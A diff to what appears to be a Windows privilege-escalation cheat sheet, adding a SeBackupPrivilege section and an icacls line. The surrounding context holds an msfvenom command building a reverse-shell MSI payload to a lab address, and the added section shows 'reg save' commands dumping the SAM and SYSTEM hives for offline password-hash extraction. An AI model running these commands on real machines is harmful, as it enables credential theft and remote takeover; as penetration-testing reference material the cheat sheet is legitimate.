@@ -59,7 +59,7 @@ windows version registry key print
 netstat -nat
 
 # User Enumeration
-whoami /priv, whoami/all
+whoami /priv, whoami /all
 net user <user>
 
 # Services Enumeration
@@ -97,6 +97,15 @@ Create a payload.msi with MSFVenom (Reverse Shell)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
 ```
 
+### SeBackupPrivilege
+
+Create a copy of SYSTEM and SAM dump with [secretsdump.py](https://github.com/fin3ss3g0d/secretsdump.py)
+
+```powershell
+PS C:\Temp> reg save HKLM\system system
+PS C:\Temp> reg save HKLM\sam sam
+```
+
 ------------------------------------------------------------------------------------------------------
 
 # File Transfers
@@ -125,4 +134,10 @@ ADS (Alternate Data Stream): is the ability to branch data into existing files w
 dir /r /s
 more < ads.txt
 more < ads.txt:file.txt
+```
+
+## Change access control lists on files and folders
+
+```powershell
+icacls file.txt
 ```
